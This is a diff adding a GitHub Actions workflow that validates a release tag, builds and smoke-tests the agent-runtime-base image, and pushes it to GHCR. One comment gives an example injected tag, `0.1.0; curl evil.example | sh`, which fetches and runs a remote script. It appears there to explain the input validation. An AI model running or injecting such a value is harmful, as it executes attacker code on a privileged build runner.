@@ -1,0 +1,148 @@
+name: runtime-image
+
+# Builds & pushes the agent-runtime-base container image to GHCR.
+#
+# Versioning is independent of the umbrella agent-controller tag — this image
+# evolves on its own cadence. Tag format: `runtime-image/vX.Y.Z` (stable) or
+# `runtime-image/vX.Y.Z-<suffix>` (prerelease; not tagged as `:latest`).
+
+on:
+  push:
+    tags:
+      - 'runtime-image/v*.*.*'
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Image tag to push (e.g. 0.1.0 or 0.1.0-rc1). Required for manual runs.'
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  packages: write    # for GHCR push
+
+jobs:
+  build:
+    name: build & push agent-runtime-base
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # Full history (not shallow) so `git describe --tags` can find the
+          # nearest umbrella tag when computing the bundled agentctl version.
+          fetch-depth: 0
+
+      - name: Resolve image tag + bundled agentctl version
+        id: tag
+        # Pass workflow_dispatch input via env (NOT direct ${{ }} expansion
+        # into the bash script body), then validate the shape before using
+        # it for anything privileged. Direct expansion would let a manually-
+        # crafted tag like `0.1.0; curl evil.example | sh` execute on the
+        # runner with `packages: write`. Codex pass 8 of slice 4.2 caught
+        # this script-injection vector.
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+        run: |
+          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
+            VERSION="${INPUT_TAG}"
+          else
+            # Tag is `runtime-image/vX.Y.Z` — strip the prefix.
+            VERSION="${GITHUB_REF_NAME#runtime-image/v}"
+          fi
+          # Validate as semver (X.Y.Z or X.Y.Z-suffix). Anything else
+          # could break the docker tag format and / or smuggle shell
+          # metacharacters into the multiline `tags:` output below.
+          if ! [[ "${VERSION}" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::resolved version ${VERSION} is not valid semver (expected X.Y.Z or X.Y.Z-suffix)"
+            exit 1
+          fi
+          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
+
+          # The image tag is independent of agentctl's version. Derive the
+          # bundled agentctl component version from the nearest umbrella
+          # tag (vX.Y.Z) reachable from this commit — that's the agent-
+          # controller release whose `cli/` tree this binary is being
+          # built from. Falls back to a short SHA when no umbrella tag is
+          # reachable (e.g. on a feature branch). Codex pass 4 of slice
+          # 4.2 caught the original `AGENTCTL_VERSION=<image tag>` which
+          # mislabeled the bundled CLI version.
+          AGENTCTL_VERSION="$(git describe --tags --match 'v*.*.*' --always 2>/dev/null || echo "${GITHUB_SHA::7}")"
+          echo "agentctl_version=${AGENTCTL_VERSION}" >> "$GITHUB_OUTPUT"
+
+          # Stable releases (no hyphen) get the `:latest` tag too. Prereleases
+          # only push the explicit version. Mirrors the `release` workflow's
+          # `make_latest` behaviour.
+          if [[ "${VERSION}" == *-* ]]; then
+            echo "latest_tag=" >> "$GITHUB_OUTPUT"
+          else
+            echo "latest_tag=ghcr.io/ccdevelopforfun/agent-runtime-base:latest" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Set up QEMU
+        uses: docker/setup-qemu-action@v3
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Log in to GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      # Two-step build/push so smoke testing gates the publish, not the other
+      # way around. Step 1 builds a single-arch image locally and runs the
+      # smoke test. Step 2 builds multi-arch and pushes ONLY if smoke
+      # succeeded. Both share buildx's GHA layer cache so the second build
+      # is fast. Codex pass 2 of slice 4.2 caught the original push-then-
+      # smoke order leaving broken images on GHCR when the smoke failed.
+
+      - name: Build native arch for smoke test
+        uses: docker/build-push-action@v5
+        with:
+          # Context is the repo root because the Dockerfile builds agentctl
+          # from `cli/` in-tree (bit-reproducible vs `go install ...@vX.Y.Z`).
+          # Codex pass 1 of slice 4.2 caught the original `context: runtime-image`
+          # which excluded `cli/` and broke the build.
+          context: .
+          file: runtime-image/Dockerfile
+          platforms: linux/amd64
+          load: true
+          push: false
+          tags: agent-runtime-base:smoke
+          build-args: |
+            AGENTCTL_VERSION=${{ steps.tag.outputs.agentctl_version }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Smoke test — agentctl --help + label sanity
+        run: |
+          docker run --rm agent-runtime-base:smoke --help | grep -q "Usage:" \
+            || { echo "::error::agentctl --help failed inside the built image"; exit 1; }
+          label_version="$(docker inspect agent-runtime-base:smoke --format='{{ index .Config.Labels "org.agent-controller.agentctl-version" }}')"
+          [ "${label_version}" = "${{ steps.tag.outputs.agentctl_version }}" ] \
+            || { echo "::error::label org.agent-controller.agentctl-version=${label_version} does not match expected ${{ steps.tag.outputs.agentctl_version }}"; exit 1; }
+
+      - name: Build & push multi-arch (linux/amd64, linux/arm64)
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          file: runtime-image/Dockerfile
+          platforms: linux/amd64,linux/arm64
+          push: true
+          tags: |
+            ghcr.io/ccdevelopforfun/agent-runtime-base:${{ steps.tag.outputs.version }}
+            ${{ steps.tag.outputs.latest_tag }}
+          # Pass AGENTCTL_VERSION so the in-image label + the `-X main.version`
+          # ldflag actually reflect the release tag, not the Dockerfile's
+          # `dev` default. Codex pass 2 of slice 4.2 caught the missing
+          # build-arg.
+          build-args: |
+            AGENTCTL_VERSION=${{ steps.tag.outputs.agentctl_version }}
+          labels: |
+            org.opencontainers.image.revision=${{ github.sha }}
+            org.opencontainers.image.created=${{ github.event.head_commit.timestamp }}
+            org.opencontainers.image.version=${{ steps.tag.outputs.version }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
